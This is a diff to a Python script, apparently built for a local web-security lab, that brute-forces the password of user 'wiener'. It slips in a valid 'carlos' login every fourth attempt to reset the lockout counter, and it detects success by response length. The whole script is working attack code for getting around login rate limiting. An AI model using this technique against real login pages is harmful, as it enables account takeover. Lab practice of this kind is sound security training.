@@ -8,6 +8,9 @@ import typer
 from rich.console import Console
 from rich.progress import Progress
 from lxml import html
+from rich import print
+from rich.panel import Panel
+
 from valid8 import validate
 
 console = Console()
@@ -23,51 +26,44 @@ def get_password():
 
 
 def check_login_blocked(response):
-    html_document = html.fromstring(response.content)
-    check_block = html_document.xpath("//label[@id='error-label']")[0].text
-    if len(check_block) > 0 and check_block == "You're blocked. Please try again in 1 minute":
-        raise Exception(check_block[0].text)
+    error = "You're blocked. Please try again in 1 minute"
+    if  error in str(response.content):
+        raise Exception(error)
 
 
 def login(server):
     passwords = get_password()
     current_password = None
     index = 1
+    found = False
     with Progress() as progress:
         task = progress.add_task("[bold yellow]Try to access to Wiener account and discovering password...", total=len(passwords))
         while len(passwords) > 0:
-            if index % 4 == 0:
-                response = requests.post(f"{server}/login", data={
+            if index % 4 == 0 or index == 1:
+                response = requests.post(f"{server}/home/login", json={
                     "username": "carlos",
                     "password": "montoya"
                 })
             else:
                 current_password = passwords.pop()
-                response = requests.post(f"{server}/login", data={
+                response = requests.post(f"{server}/home/login", json={
                     "username": "wiener",
                     "password": current_password
                 })
                 progress.update(task, advance=1)
-
+                check_login_blocked(response)
+                if len(response.content)==14 and len(passwords) > 0:
+                    progress.update(task_id=task, description="[bold green]Password found", advance=len(passwords))
+                    found = True
+                    break
             index += 1
-            check_login_blocked(response)
-            if "302" not in str(response.history) and len(passwords) > 0:
-                progress.update(task_id=task, description="[bold green]Password found", advance=len(passwords))
-                break
-    print("The password of Wiener is: " + current_password)
-
-
-def check_lab_solver(server):
-    response = requests.get(f"{server}/")
-    html_document = html.fromstring(response.content)
-    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
-    success_message = "Congratulations, you solved the lab!".center(100)
-    error_message = "Not Solved!".center(100)
-
-    if solved_link:
-        console.print(success_message, style="blink bold white on dark_green")
+    if found:
+        print("The password of Wiener is: " + current_password)
     else:
-        console.print(error_message, style="blink bold white on red")
+        print("Password not found!")
+
+   
+
 
 
 def pattern(regex: str) -> Callable[[str], bool]:
@@ -81,11 +77,9 @@ def pattern(regex: str) -> Callable[[str], bool]:
 
 
 def validate_server(server):
-    validate("server", server, custom=[pattern(r'\w{4,5}:\/\/(localhost|127.0.0.1):4200$')],
+    validate("server", server, custom=[pattern(r'\w{4,5}:\/\/(localhost|127.0.0.1):8082$')],
              help_msg="Insert a valid localhost URL")
 
-    if requests.get(f"{server}").status_code != 200:
-        raise Exception("URL NOT VALID!")
 
 
 def is_lab_solved(server):
@@ -106,11 +100,7 @@ def main(
 ):
     validate_server(server)
 
-    with console.status("Try to access to Wiener account..."):
-        login(server)
-
-    with console.status("Checking solving lab"):
-        check_lab_solver(server)
+    login(server)
 
 
 def run():
